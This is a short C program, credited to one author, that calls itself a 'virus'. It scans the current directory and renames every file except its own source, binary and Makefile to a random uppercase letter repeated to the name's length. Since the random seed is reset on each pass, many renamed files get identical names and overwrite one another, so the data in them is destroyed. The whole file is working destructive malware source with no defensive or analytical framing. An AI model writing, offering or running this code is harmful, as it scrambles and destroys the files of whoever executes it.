#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>

/*Author: Parker Arnold*/

#define UNTOUCHABLES_SIZE 7
/*Files the virus cannot touch.*/
const char* UNTOUCHABLES[UNTOUCHABLES_SIZE] = {".", "..", "pvirus", "pvirus.c", "Makefile", "main", "main.c"};

/*Changes the fileName to be a random character repeated for
the same length as the orginial fileName*/
void changeFileName(char* fileName) {
	char* newFileName = (char*)malloc(sizeof(char)*NAME_MAX);
	int i;

	strcpy(newFileName, fileName);

	i = 0;
	while (newFileName[i] != '\0') {
		srand(time(0));
		char newChr = (rand() % 25) + 65;
		newFileName[i] = newChr;
		i++;
	}
	
	rename(fileName, newFileName);
	free(newFileName);
}

/*Loops through directory, changing filename when permissible*/
int main() {
	DIR *folder;
	struct dirent *entry;
	int untouchable;
	
	
	folder = opendir(".");
	if (folder) {
		while ((entry = readdir(folder)) != NULL) {
			untouchable = 0;
			for (int i = 0; i < UNTOUCHABLES_SIZE; i++) {
				if (strcmp(entry->d_name, UNTOUCHABLES[i]) == 0) {
					untouchable = 1;
				}
			}
			
			
			if (!untouchable) {
			changeFileName(entry->d_name);
			}
		}
		closedir(folder);
	}
}
